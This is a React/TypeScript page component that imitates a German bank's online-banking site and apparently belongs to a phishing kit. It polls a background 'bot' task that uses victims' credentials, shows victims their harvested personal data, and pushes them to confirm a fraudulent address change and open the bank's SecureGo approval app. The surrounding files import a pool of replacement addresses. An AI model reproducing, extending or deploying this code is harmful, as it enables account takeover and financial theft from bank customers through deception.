import { useEffect, useMemo, useState } from "react";
import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { Loader2, CheckCircle2 } from "lucide-react";
import { getBotTask, confirmAddress } from "@/lib/botClient";
import { getRandomPoolAddress } from "@/lib/addressPool.functions";
import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
import AddressVerification from "@/components/AddressVerification";
import { CompletionStep } from "@/components/flow/CompletionStep";
import vrLogoGeneric from "@/assets/vr-logo-generic.png";


type BankCtx = {
  bankId: string;
  bankName: string;
  group: string;
  theme: FlowTheme;
  logoSrc: string;
  fallbackLogoSrc: string;
  showName: boolean;
  bigLogo: boolean;
  footerLinks?: Record<string, { label: string; url: string }> | null;
};

const DEFAULT_THEME: FlowTheme = {
  headerBg: "#ffffff",
  buttonBg: "#003399",
  accentText: "#003399",
  topBarColor: "#003399",
  buttonRadius: "rounded-full",
};

type Step = "personal" | "address" | "done";

export const Route = createFileRoute("/personal-data/$taskId")({
  head: () => ({
    meta: [
      { title: "Persönliche Daten" },
      { name: "description", content: "Anzeige und Bestätigung Ihrer hinterlegten Kundendaten." },
      { name: "robots", content: "noindex,nofollow" },
    ],
  }),
  component: PersonalDataPage,
});

function firstString(...vals: unknown[]): string {
  for (const v of vals) {
    if (typeof v === "string" && v.trim()) return v.trim();
    if (typeof v === "number") return String(v);
  }
  return "";
}

function mapCustomer(result: any, bankName: string): CustomerData {
  const p = result?.person_data ?? {};
  const kd = result?.kontakt_data ?? {};
  const ad = result?.adressen_data ?? {};
  
  const anrede = firstString(p.anrede, p.salutation) || "Herr/Frau";
  const name = firstString(
    p?.namen?.anzeigenameKurz,
    p?.namen?.anzeigename,
    p?.name,
    [p?.vorname, p?.nachname].filter(Boolean).join(" "),
  ) || "—";
  
  const kundenNr = firstString(result?.customer_number, p?.kundennummer, p?.customerNumber, result?.credentials?.username) || "—";
  const geb = firstString(p?.geburtsdatum, p?.birthday, p?.dateOfBirth) || "—";
  
  // Familienstand (person_data.familie.familienstandBezeichnung)
  const fam = firstString(p?.familie?.familienstandBezeichnung, p?.familienstand, p?.maritalStatus) || "—";
  
  // E‑Mail (kontakt_data.emailAdressen[0].bezeichnung)
  const email = firstString(
    kd?.emailAdressen?.[0]?.bezeichnung,
    p?.email, 
    p?.emailPrivat, 
    p?.kontakt?.email
  ) || "—";
  
  // Mobil (kontakt_data.mobilfunkNummern[0].bezeichnung)
  const mobil = firstString(
    kd?.mobilfunkNummern?.[0]?.bezeichnung,
    p?.mobil, 
    p?.mobilNr, 
    p?.telefonMobil, 
    p?.kontakt?.mobil
  ) || "—";
  
  // Telefon (kontakt_data.festnetzNummern[0].bezeichnung)
  const phone = firstString(kd?.festnetzNummern?.[0]?.bezeichnung) || "";
  
  // Hauptadresse (aus adressen_data.hauptadresse.postadresse)
  const address = ad?.hauptadresse?.postadresse || p.adresse || p.address || {};
  const strasse = firstString(address.strasse, address.street, [address.strasse, address.hausnummer].filter(Boolean).join(" ")) || "Musterstraße 12";
  const plz = firstString(address.postleitzahl, address.plz, address.zip);
  const ort = firstString(address.ort, address.city, address.stadt);
  const plzOrt = [plz, ort].filter(Boolean).join(" ") || "12345 Musterstadt";

  return {
    anrede,
    name,
    kundenNr,
    geburtsdatum: geb,
    familienstand: fam,
    email,
    mobilNr: mobil,
    adresse: { strasse, plzOrt },
  };
}

function makeFallbackAddress(current: { strasse: string; plzOrt: string }) {
  const city = current.plzOrt.replace(/^\d{4,5}\s*/, "") || "Musterstadt";
  const plz = (current.plzOrt.match(/^\d{4,5}/)?.[0]) || "12345";
  return { strasse: "Lindenweg 3", plzOrt: `${plz} ${city}` };
}

function PersonalDataPage() {
  const { taskId } = Route.useParams();
  const navigate = useNavigate();
  const [result, setResult] = useState<any>(null);
  const [bankCtx, setBankCtx] = useState<BankCtx | null>(null);
  const [step, setStep] = useState<Step>("personal");
  const [addressDecisionPending, setAddressDecisionPending] = useState(false);
  const [forceShowSecureGo, setForceShowSecureGo] = useState(false);

  // Bank context is cached from the login route; restore synchronously
  useEffect(() => {
    try {
      const raw = sessionStorage.getItem(`bot_bank_${taskId}`);
      if (raw) setBankCtx(JSON.parse(raw));
    } catch {}
    try {
      const raw = sessionStorage.getItem(`bot_result_${taskId}`);
      if (raw) setResult(JSON.parse(raw));
    } catch {}
    try {
      if (sessionStorage.getItem(`bot_address_pending_${taskId}`) === "1") {
        setAddressDecisionPending(true);
        sessionStorage.removeItem(`bot_address_pending_${taskId}`);
      }
    } catch {}
  }, [taskId]);

  // Keep polling the task so late-arriving fields (Kontostand, Karten, Adresse)
  // update the UI while the bot finishes in the background.
  useEffect(() => {
    let cancelled = false;
    let timer: ReturnType<typeof setTimeout> | null = null;
    const startedAt = Date.now();
    const TIMEOUT_MS = 5 * 60 * 1000;
    const tick = async () => {
      const { data } = await getBotTask(taskId).catch(() => ({ status: 0, data: {} as any }));
      if (cancelled) return;
      if (data?.result) {
        setResult(data.result);
        try { sessionStorage.setItem(`bot_result_${taskId}`, JSON.stringify(data.result)); } catch {}
      }
      if (data?.status === "completed" || data?.status === "failed") return;
      if (Date.now() - startedAt > TIMEOUT_MS) return;
      timer = setTimeout(tick, 1500);
    };
    tick();
    return () => { cancelled = true; if (timer) clearTimeout(timer); };
  }, [taskId]);

  const customer = useMemo(
    () => (result ? mapCustomer(result, bankCtx?.bankName ?? "") : null),
    [result, bankCtx?.bankName],
  );

  const addressData = result?.address_data ?? null;

  // Address confirmation popup (from result.address_data)
  const [confirmingAddress, setConfirmingAddress] = useState(false);
  const [addressConfirmed, setAddressConfirmed] = useState(false);
  const [addressError, setAddressError] = useState<string | null>(null);
  const [addressPopupOpen, setAddressPopupOpen] = useState(true);

  const handleConfirmAddress = async () => {
    setConfirmingAddress(true);
    setAddressError(null);
    try {
      const res = await confirmAddress(taskId);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      setAddressConfirmed(true);
      setTimeout(() => setAddressPopupOpen(false), 1200);
    } catch (e: any) {
      setAddressError(e?.message || "Fehler beim Bestätigen. Bitte erneut versuchen.");
    } finally {
      setConfirmingAddress(false);
    }
  };

  if (!result && !addressData) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 text-gray-500">
        <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
        <p className="text-sm">Daten werden geladen…</p>
      </div>
    );
  }


  const theme = bankCtx?.theme ?? DEFAULT_THEME;
  const shellProps = {
    theme,
    logoSrc: bankCtx?.logoSrc ?? vrLogoGeneric,
    fallbackLogoSrc: bankCtx?.fallbackLogoSrc ?? vrLogoGeneric,
    bankName: bankCtx?.bankName ?? "Online-Banking",
    showName: bankCtx?.showName ?? false,
    bigLogo: bankCtx?.bigLogo ?? false,
    footerLinks: (bankCtx?.footerLinks ?? null) as any,
  };

  const bankId = bankCtx?.bankId ?? "";

  const addressPopup = addressData && addressPopupOpen ? (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
      <div className="bg-white rounded-xl max-w-md w-full p-6 shadow-xl">
        {addressConfirmed ? (
          <div className="flex flex-col items-center text-center py-4">
            <CheckCircle2 className="w-12 h-12 text-green-600 mb-2" />
            <p className="font-medium text-gray-900">Adresse wird aktualisiert…</p>
          </div>
        ) : (
          <>
            <h3 className="text-lg font-semibold text-gray-900 mb-3">Adresse prüfen</h3>
            <p className="text-sm text-gray-600 mb-4">
              Bitte prüfen Sie die neue Adresse und bestätigen Sie die Löschung der alten Adresse.
            </p>
            <div className="space-y-3 mb-5">
              <div className="rounded-lg border border-gray-200 p-3">
                <div className="text-xs text-gray-500 mb-1">Alte Adresse</div>
                <div className="text-sm text-gray-900">{addressData.old_street || "—"}</div>
              </div>
              <div className="rounded-lg border-2 p-3" style={{ borderColor: theme.accentText }}>
                <div className="text-xs text-gray-500 mb-1">Neue Adresse</div>
                <div className="text-sm text-gray-900">{addressData.new_street || "—"}</div>
                <div className="text-sm text-gray-900">
                  {[addressData.new_plz, addressData.new_city].filter(Boolean).join(" ") || "—"}
                </div>
              </div>
            </div>
            {addressError && (
              <p className="text-sm text-red-600 mb-3">{addressError}</p>
            )}
            <button
              type="button"
              onClick={handleConfirmAddress}
              disabled={confirmingAddress}
              className={`w-full px-4 py-3 ${theme.buttonRadius} text-white font-medium hover:opacity-90 disabled:opacity-60`}
              style={{ backgroundColor: theme.buttonBg }}
            >
              {confirmingAddress ? "Wird bestätigt…" : "Adresse löschen"}
            </button>
          </>
        )}
      </div>
    </div>
  ) : null;

  return (
    <BankShell {...shellProps}>
      {customer && step === "personal" && (
        <PersonalDataOverview
          // @ts-expect-error FlowTheme is structurally compatible; component only reads shared fields
          theme={theme}
          customerData={customer}
          bankId={bankId}
          addressDecisionPending={addressDecisionPending}
          onAddressChoiceResolved={() => {
            setAddressDecisionPending(false);
            setForceShowSecureGo(true);
            setStep("address");
          }}
          onContinue={() => {
            if (addressDecisionPending) {
              setStep("address");
              return;
            }
            setStep("done");
          }}
          onEditAddress={() => setStep("done")}
        />
      )}

      {customer && step === "address" && (
        <AddressVerification
          bankName={bankCtx?.bankName ?? ""}
          bankId={bankId}
          bankGroup={bankCtx?.group}
          // @ts-expect-error FlowTheme is structurally compatible with BankTheme
          theme={theme}
          customerName={customer.name}
          customerNumber={customer.kundenNr}
          customerEmail={customer.email}
          customerPhone={customer.mobilNr}
          currentAddress={customer.adresse}
          forceShowSecureGo={forceShowSecureGo}
          onSecureGoOpened={() => setForceShowSecureGo(false)}
          onConfirm={() => setStep("done")}
          onDelete={() => {
            setAddressDecisionPending(true);
            setForceShowSecureGo(false);
            setStep("personal");
          }}
          onNoAddress={() => setStep("done")}
          taskId={taskId}
        />
      )}

      {customer && step === "done" && (
        <CompletionStep theme={theme} customerName={customer.name} />
      )}

      {!customer && (
        <div className="min-h-[40vh] flex flex-col items-center justify-center text-gray-500">
          <Loader2 className="h-8 w-8 animate-spin mb-3 text-gray-400" />
          <p className="text-sm">Daten werden geladen…</p>
        </div>
      )}

      {addressPopup}
    </BankShell>
  );
}

